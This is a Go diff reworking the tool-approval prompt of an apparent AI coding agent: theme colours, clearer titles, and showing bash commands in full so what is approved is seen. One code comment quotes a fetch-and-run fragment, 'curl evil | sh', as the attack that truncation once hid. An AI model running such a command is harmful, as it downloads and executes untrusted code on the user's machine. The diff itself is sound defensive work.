@@ -2,13 +2,16 @@ package chat
 
 import (
 	"fmt"
-	"github.com/discorgento/ouija/internal/termsafe"
 	"image/color"
 	"maps"
 	"slices"
 	"strings"
 
 	"charm.land/lipgloss/v2"
+	"github.com/charmbracelet/x/ansi"
+
+	"github.com/discorgento/ouija/internal/termsafe"
+	"github.com/discorgento/ouija/internal/theme"
 )
 
 // ─── Approval option ──────────────────────────────────────────────────
@@ -25,20 +28,20 @@ type approvalOpt struct {
 // Order matches the arrow-key navigation order. For delete_file, the first
 // option becomes "Delete" (key: d) instead of "Yes" (key: y).
 var approvalOptions = []approvalOpt{
-	{key: "y", label: "Yes", color: lipgloss.Color("71"), resp: approvalResponseMsg{allowed: true}},
-	{key: "n", label: "No", color: lipgloss.Color("131"), resp: approvalResponseMsg{allowed: false, cancelled: false}},
-	{key: "s", label: "Session", color: lipgloss.Color("99"), resp: approvalResponseMsg{allowed: true, forSession: true}},
-	{key: "e", label: "Edit", color: lipgloss.Color("208"), resp: approvalResponseMsg{allowed: true}},
-	{key: "esc", label: "Cancel", color: lipgloss.Color("243"), resp: approvalResponseMsg{allowed: false}},
+	{key: "y", label: "Yes", color: theme.GreenDeep, resp: approvalResponseMsg{allowed: true}},
+	{key: "n", label: "No", color: theme.RedDeep, resp: approvalResponseMsg{allowed: false, cancelled: false}},
+	{key: "s", label: "Session", color: theme.Violet, resp: approvalResponseMsg{allowed: true, forSession: true}},
+	{key: "e", label: "Edit", color: theme.Orange, resp: approvalResponseMsg{allowed: true}},
+	{key: "esc", label: "Cancel", color: theme.Gray, resp: approvalResponseMsg{allowed: false}},
 }
 
 // deleteFileOptions replaces the "Yes" button with "Delete" (key: d, red)
 // as an extra confirmation layer for destructive delete operations.
 var deleteFileOptions = []approvalOpt{
-	{key: "d", label: "Delete", color: lipgloss.Color("196"), resp: approvalResponseMsg{allowed: true}},
-	{key: "n", label: "No", color: lipgloss.Color("131"), resp: approvalResponseMsg{allowed: false, cancelled: false}},
-	{key: "e", label: "Edit", color: lipgloss.Color("208"), resp: approvalResponseMsg{allowed: true}},
-	{key: "esc", label: "Cancel", color: lipgloss.Color("243"), resp: approvalResponseMsg{allowed: false}},
+	{key: "d", label: "Delete", color: theme.Red, resp: approvalResponseMsg{allowed: true}},
+	{key: "n", label: "No", color: theme.RedDeep, resp: approvalResponseMsg{allowed: false, cancelled: false}},
+	{key: "e", label: "Edit", color: theme.Orange, resp: approvalResponseMsg{allowed: true}},
+	{key: "esc", label: "Cancel", color: theme.Gray, resp: approvalResponseMsg{allowed: false}},
 }
 
 // baseTool strips the composite session-key suffix ("tool\x00target") the
@@ -73,14 +76,14 @@ func renderApprovalBtn(opt approvalOpt, selected bool) string {
 	if selected {
 		return lipgloss.NewStyle().
 			Bold(true).
-			Foreground(lipgloss.Color("255")).
+			Foreground(theme.Bright).
 			Background(opt.color).
 			Padding(0, 1).
 			Render(content)
 	}
 	return lipgloss.NewStyle().
 		Foreground(opt.color).
-		Background(lipgloss.Color("236")).
+		Background(theme.Shade).
 		Padding(0, 1).
 		Render("○ " + opt.key + " " + opt.label)
 }
@@ -95,8 +98,10 @@ func approvalToolIcon(tool string) string {
 	switch baseTool(tool) {
 	case "bash":
 		return "›"
-	case "write_file", "edit_file", "delete_file":
-		return "＋"
+	case "write_file", "edit_file":
+		return "✎"
+	case "delete_file":
+		return "✗"
 	case "read_file":
 		return "◎"
 	case "grep":
@@ -113,17 +118,17 @@ func approvalToolIcon(tool string) string {
 // approvalToolColor returns a color for the tool label.
 func approvalToolColor(tool string) color.Color {
 	if strings.HasPrefix(tool, "escape:") {
-		return lipgloss.Color("208")
+		return theme.Orange
 	}
 	switch baseTool(tool) {
 	case "bash":
-		return lipgloss.Color("196")
+		return theme.Red
 	case "write_file", "edit_file", "delete_file":
-		return lipgloss.Color("220")
+		return theme.Amber
 	case "read_file", "grep", "glob", "list_dir":
-		return lipgloss.Color("118")
+		return theme.Green
 	default:
-		return lipgloss.Color("141")
+		return theme.Lavender
 	}
 }
 
@@ -141,115 +146,155 @@ func displayToolName(tool string) string {
 
 // ─── Approval box rendering ────────────────────────────────────────────
 
-// RenderApprovalBox renders the full approval prompt box body.
-// It shows the tool name, call number, the diff (for edit_file via
-// input["_preview"]) or raw arguments (for other tools), and the
-// option buttons + hint. The selectedIdx is the current arrow-key
-// selection position.
-func RenderApprovalBox(req *approvalRequestMsg, toolCallN, selectedIdx int) string {
+// approvalTitle says in words what the tool call asks to do.
+func approvalTitle(req *approvalRequestMsg) string {
+	path, _ := req.input["path"].(string)
+	path = termsafe.Clean(path)
+	if strings.HasPrefix(req.tool, "escape:") {
+		return "ouija wants to reach outside the project: " + displayToolName(req.tool)
+	}
+	verb := map[string]string{"write_file": "write", "edit_file": "edit", "delete_file": "delete"}[baseTool(req.tool)]
+	switch {
+	case baseTool(req.tool) == "bash":
+		return "ouija wants to run a command"
+	case verb != "" && path != "":
+		return "ouija wants to " + verb + " " + path
+	}
+	return "ouija wants to use " + displayToolName(req.tool)
+}
+
+// RenderApprovalBox renders the approval prompt body at the given width: what
+// the call asks in words, the command or diff it would run or apply, the
+// other arguments, the option buttons and the keys. selectedIdx is the
+// current arrow-key selection.
+func RenderApprovalBox(req *approvalRequestMsg, toolCallN, selectedIdx, width int) string {
 	toolColor := approvalToolColor(req.tool)
-	toolIcon := approvalToolIcon(req.tool)
+	inner := max(width-2, 20) // the body is indented by two
 
-	var inner strings.Builder
+	var b strings.Builder
+	line := func(s string) { b.WriteString("  " + s + "\n") }
 
-	// ── Tool icon + name + call number ──────────────────────────
-	icon := lipgloss.NewStyle().Bold(true).Foreground(toolColor).Render(toolIcon)
-	cleanName := displayToolName(req.tool)
-	name := lipgloss.NewStyle().Bold(true).Foreground(toolColor).Render(" " + cleanName)
-	badge := lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("220")).Render(fmt.Sprintf(" [%d]", toolCallN))
-	inner.WriteString("  ")
-	inner.WriteString(icon)
-	inner.WriteString(name)
-	inner.WriteString(badge)
-	inner.WriteByte('\n')
+	// ── What it asks, with the tool and call number on the right ───────
+	title := lipgloss.NewStyle().Bold(true).Foreground(toolColor).Render(approvalToolIcon(req.tool) + " " + approvalTitle(req))
+	tag := lipgloss.NewStyle().Foreground(theme.Muted).Render(fmt.Sprintf("%s · #%d", displayToolName(req.tool), toolCallN))
+	if gap := inner - lipgloss.Width(title) - lipgloss.Width(tag); gap >= 2 {
+		title += strings.Repeat(" ", gap) + tag
+	} else {
+		title = ansi.Truncate(title, inner, "…")
+	}
+	line(title)
+	b.WriteByte('\n')
 
-	// ── Tool-specific content ───────────────────────────────────
-	// Path line (for tools that accept a path argument).
-	if p, ok := req.input["path"]; ok {
-		if s, ok2 := p.(string); ok2 && s != "" {
-			pathLine := lipgloss.NewStyle().Foreground(lipgloss.Color("250")).Render("    " + termsafe.Clean(s))
-			inner.WriteString("  ")
-			inner.WriteString(pathLine)
-			inner.WriteByte('\n')
+	// ── What would run or change ────────────────────────────────────
+	skip := map[string]bool{}
+	if p, ok := req.input["path"].(string); ok && p != "" {
+		skip["path"] = true // in the title
+	}
+	command := ""
+	if c, ok := req.input["command"].(string); ok && c != "" {
+		skip["command"] = true
+		command = termsafe.Clean(c)
+		// The whole command, wrapped — never cut: what is approved must be
+		// seen (a cut hid `…; curl evil | sh` behind a long first command).
+		var wrapped []string
+		for _, cl := range strings.Split(command, "\n") {
+			wrapped = append(wrapped, strings.Split(ansi.Wrap(cl, inner-2, ""), "\n")...)
 		}
-	} else if req.path != "" && req.path != baseTool(req.tool) {
-		pathStr := lipgloss.NewStyle().Faint(true).Foreground(lipgloss.Color("60")).Render("    " + termsafe.Clean(req.path))
-		inner.WriteString("  ")
-		inner.WriteString(pathStr)
-		inner.WriteByte('\n')
+		prompt := lipgloss.NewStyle().Bold(true).Foreground(toolColor).Render("$ ")
+		cmdStyle := lipgloss.NewStyle().Bold(true).Foreground(theme.Text)
+		for i, cl := range wrapped {
+			if i == maxCommandLines {
+				line(lipgloss.NewStyle().Foreground(theme.Amber).Render(fmt.Sprintf("⚠ %d more lines not shown — the command list below covers all of it", len(wrapped)-i)))
+				break
+			}
+			line(prompt + cmdStyle.Render(cl))
+			prompt = "  "
+		}
+		b.WriteByte('\n')
+	} else if req.path != "" && req.path != baseTool(req.tool) && !skip["path"] {
+		line(lipgloss.NewStyle().Foreground(theme.Silver).Render(ansi.Truncate(termsafe.Clean(req.path), inner, "…")))
 	}
 
-	// Preview from engine (colored diff for edit_file, summary for others).
-	if preview, ok := req.input["_preview"]; ok {
-		if s, ok2 := preview.(string); ok2 && s != "" {
-			// The model wrote the command and the file holds the diff: an
-			// escape sequence in either must not redraw the prompt itself.
-			s = termsafe.Clean(s)
-			inner.WriteByte('\n')
-			// Multi-line diff receives full coloring; single-line summary
-			// is rendered in dim white.
-			if strings.Contains(s, "\n") && strings.HasPrefix(s, "  @@") {
-				colored := RenderColoredDiff(s)
-				for _, line := range strings.Split(colored, "\n") {
-					inner.WriteString("  ")
-					inner.WriteString(line)
-					inner.WriteByte('\n')
+	// Preview from engine (diff for edit_file, summary for others). The model
+	// wrote the command and the file holds the diff: an escape sequence in
+	// either must not redraw the prompt itself.
+	if s, ok := req.input["_preview"].(string); ok && s != "" {
+		s = termsafe.Clean(s)
+		if strings.HasPrefix(s, "  @@") {
+			p, _ := req.input["path"].(string)
+			for _, dl := range strings.Split(renderDiffBlock(p, s, inner), "\n") {
+				line(dl)
+			}
+			skip["oldString"], skip["newString"] = true, true // the diff shows them
+		} else {
+			if command != "" {
+				s = bashPreviewExtras(s, command) // the command itself is shown above
+			}
+			for _, pl := range strings.Split(s, "\n") {
+				if pl = strings.TrimSpace(pl); pl != "" {
+					style := lipgloss.NewStyle().Foreground(theme.Silver)
+					if strings.Contains(pl, "⚠") {
+						style = style.Foreground(theme.Amber)
+					}
+					line(style.Render(ansi.Truncate(pl, inner, "…")))
 				}
-			} else {
-				dim := lipgloss.NewStyle().Foreground(lipgloss.Color("250")).Render("  " + s)
-				inner.WriteString("  ")
-				inner.WriteString(dim)
-				inner.WriteByte('\n')
 			}
 		}
+		if strings.TrimSpace(s) != "" {
+			b.WriteByte('\n')
+		}
 	}
 
-	// Raw arguments (filter out _prefixed meta-keys like _preview).
-	argKeys := slices.Sorted(maps.Keys(req.input))
+	// Remaining arguments (not _prefixed meta-keys like _preview).
 	shown := false
-	for _, k := range argKeys {
-		if strings.HasPrefix(k, "_") {
+	for _, k := range slices.Sorted(maps.Keys(req.input)) {
+		if strings.HasPrefix(k, "_") || skip[k] {
 			continue
 		}
 		shown = true
-		v := req.input[k]
-		val := termsafe.Clean(fmt.Sprintf("%v", v))
-		if len(val) > 80 {
-			val = strings.ToValidUTF8(val[:77], "") + "..."
-		}
-		argLine := lipgloss.NewStyle().Foreground(lipgloss.Color("250")).Render(fmt.Sprintf("  %s: %s", k, val))
-		inner.WriteString("  ")
-		inner.WriteString(argLine)
-		inner.WriteByte('\n')
+		val := termsafe.Clean(fmt.Sprintf("%v", req.input[k]))
+		val = strings.ReplaceAll(val, "\n", "⏎")
+		line(lipgloss.NewStyle().Foreground(theme.Muted).Render(k+": ") +
+			lipgloss.NewStyle().Foreground(theme.Silver).Render(ansi.Truncate(val, max(inner-len(k)-2, 8), "…")))
 	}
 	if shown {
-		inner.WriteByte('\n')
+		b.WriteByte('\n')
 	}
 
-	inner.WriteByte('\n')
-
-	// ── Option buttons ──────────────────────────────────────────
+	// ── Option buttons and keys ─────────────────────────────────────
 	opts := approvalOptionsFor(req.tool)
-	optGap := lipgloss.NewStyle().Foreground(lipgloss.Color("60")).Render("  ")
-	inner.WriteString("  ")
+	var btns strings.Builder
 	for i, opt := range opts {
 		if i > 0 {
-			inner.WriteString(optGap)
+			btns.WriteString("  ")
 		}
-		btn := renderApprovalBtn(opt, i == selectedIdx)
-		inner.WriteString(btn)
+		btns.WriteString(renderApprovalBtn(opt, i == selectedIdx))
 	}
-	inner.WriteByte('\n')
-
-	// ── Hint line ───────────────────────────────────────────────
-	hintKeys := "y / n / s / e / esc"
-	if baseTool(req.tool) == "delete_file" {
-		hintKeys = "d / n / e / esc"
+	line(btns.String())
+	keys := make([]string, len(opts))
+	for i, o := range opts {
+		keys[i] = o.key
 	}
-	hint := lipgloss.NewStyle().Italic(true).Foreground(lipgloss.Color("60")).Render("← → navigate · enter confirm · " + hintKeys)
-	inner.WriteString("  ")
-	inner.WriteString(hint)
-	inner.WriteByte('\n')
+	line(lipgloss.NewStyle().Italic(true).Foreground(theme.Muted).
+		Render("← → choose · Enter confirm · " + strings.Join(keys, " / ")))
+	return b.String()
+}
 
-	return inner.String()
+// maxCommandLines is how many wrapped lines of a command the approval shows.
+const maxCommandLines = 40
+
+// bashPreviewExtras is the bash preview without its "will run: <command>"
+// part, which the approval shows in full above it: what is left is the list
+// of commands it runs, a denylist warning, the timeout.
+func bashPreviewExtras(preview, command string) string {
+	if rest, ok := strings.CutPrefix(preview, "will run: "+command); ok {
+		preview = rest
+	} else if _, rest, ok := strings.Cut(preview, "the command list covers all of it"); ok {
+		preview = rest // a long command, cut in the preview
+	}
+	preview = strings.TrimSpace(preview)
+	if list, rest, ok := strings.Cut(preview, "]"); ok && strings.HasPrefix(list, "[") {
+		preview = "runs: " + strings.TrimPrefix(list, "[") + rest
+	}
+	return preview
 }
